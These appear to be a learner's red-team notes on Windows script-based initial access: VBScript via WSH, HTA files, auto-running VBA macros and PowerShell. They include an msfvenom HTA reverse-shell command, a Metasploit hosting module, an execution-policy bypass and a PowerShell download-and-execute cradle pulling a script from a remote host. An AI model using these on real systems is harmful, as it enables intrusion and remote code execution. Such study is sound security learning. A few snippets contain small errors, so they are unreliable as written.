# WSH
- Windows Scripting Host
- Windows Native Engine
- Two executables reponsible for running Visual Basic Scrips:
	- `cscript.exe` : Command line scripts
	- `wscript.exe` : GUI Scripts
- Simple Hello World Script:
```vb
'Can be executed with wscript.exe script.vbs
Dim Message
Message = "Hello World"
MsgBox Message
```
- Run a program with vbs
```vb
Set Shell = Wscript.CreateObject("Wscript.Shell")
Shell.run("C:\Windows\System32\cmd.exe" & Wscript.ScriptFullName),0,True
'Executing the above with wscript.exe payload.exe will run cmd.exe in a new window
'Can also be run with cscript.exe
```
# HTA
- HTML Application, ends with `.hta`
- Dynamic HTML pages that contains `JScript` and `VBscript`
- `mshta.exe` is used to execute `.hta` files.
- Can also be executed automatically with Internet Explorer.
- An `.hta` files that executes binary
```html
<html>
<body>
<script>
	var c = 'cmd.exe';
	new ActiveXobject('Wscript.Shell').Run(c);
</script>
</body>
</html>
```
- This can be hosted with any web server.
- MsfVenom can be used to create a reverse shell with the `.hta` format
```bash
msfvenom -p <payload> LHOST=<ip> LPORT=<ip> -f hta-psh -o reverse.hta
```
- Metasploit exploit `exploit/windows/misc/hta_server` can be used to host a webserver hosting an HTA file.
# VBA
- Visual Basic for Application, implimented by Microsoft for it's application such as Word, Powerpoint using macros.
- Can access Windows Application Programing Interface, and low level APIs.
- Simple VBA Macro to display text:
```vb
Sub Popup()
	MsgBox ("Hello World!")
End Sub
'The above macro can be run by F5
```
- VBA to run code when the document is opened:
```vb
Sub Document_Open()
	Popup
End Sub

Sub AutoOpen()
	Popup
End Sub

Sub Popup()
	MsgBox ("Hello World")
```
- Macro is supported by specific file formats such as 
	- `.doc`
	- `.docm`
 - VBA to run commands: 
```vb
Sub Calc()
	Dim Payload as String
	Payload = "calc.exe"
	CreateObject("Wscript.Shell").Run Payload,0
End Sub
```

# PSH
- Run Powershell scripts bypassing the execution policy
```powershell
powershell.exe -ep bypass File script.ps1
```
- Run Powershell payload after downloading script from internet
```powershell
Invoke-Expression (New-Object System.Net.WebClient).DownloadString('http://172.17.0.1:8888/test.ps1')
# OR
powershell -c "Invoke-Expression (New-Object System.Net.WebClient).DownloadString('http://172.17.0.1:8888/test.ps1')"
```